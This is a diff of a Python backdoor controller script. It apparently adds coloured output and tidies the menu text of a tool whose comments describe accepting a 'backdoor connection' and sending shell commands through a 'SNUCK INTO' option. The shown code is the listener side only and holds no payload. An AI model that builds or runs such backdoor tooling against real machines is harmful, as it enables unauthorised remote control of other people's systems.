@@ -40,7 +40,7 @@ def socket_bind(): # Socket binding
         s.bind((SERVER_HOST, SERVER_PORT))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.listen(5)
-        print(f" [+] Listening for connections on port : " + str(SERVER_PORT) + "\n")
+        print(" [+] Listening for connections on port : " + str(SERVER_PORT) + "\n")
 
     except socket.error as e :
                 cprint(" Socket binding failed: ", 'red' + str(e)+"\nRetrying...", 'red')
@@ -54,15 +54,16 @@ def accept_conn(): # Accept backdoor connection
 
     client_conn, client_addr = s.accept()
     
-    print(" [+] Connection has been established ! | " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
+    print(" [+] Connection has been established! " + "IP: " + client_addr[0] + " Port: " + str(client_addr[1] ) + "\n")
     send_commands(client_conn)
 
 
 def send_commands(client_conn): # Send commands
-    
+    init()
+
     while True:
     
-        command = input(" Shell> ")
+        command = input(Fore.RED + " Shell> ")
     
 
         if command == "exit":
@@ -92,14 +93,15 @@ def main():
 
 
 def mainmenu():
+    init()
 
     os.system('cls')
     banner()
-    cprint("[1] SNUCK INTO\n", 'red')  
-    cprint("[2] HELP\n", 'red')
-    cprint("[3] QUIT\n", 'red')
+    cprint(" [1] SNUCK INTO\n", 'red')  
+    cprint(" [2] HELP\n", 'red')
+    cprint(" [3] QUIT\n", 'red')
 
-    opt = input(': ')
+    opt = input(Fore.RED + " : ")
 
     if opt == '1':
         os.system('cls')
@@ -110,9 +112,9 @@ def mainmenu():
         os.system('cls')
         banner()
         cprint(" -- WHILE YOU ARE IN SHELL THESE ARE THE COMMANDS --\n", 'red')
-        print(" exit - Close connection and go back to main menu\n")
+        cprint(" exit - Close connection and go back to main menu\n", 'red')
         
-        bacon = input(' Press 1 to go back main menu : ')
+        bacon = input(Fore.RED + " Press 1 to go back main menu : ")
         if bacon == '1':
             os.system('cls')
             mainmenu()
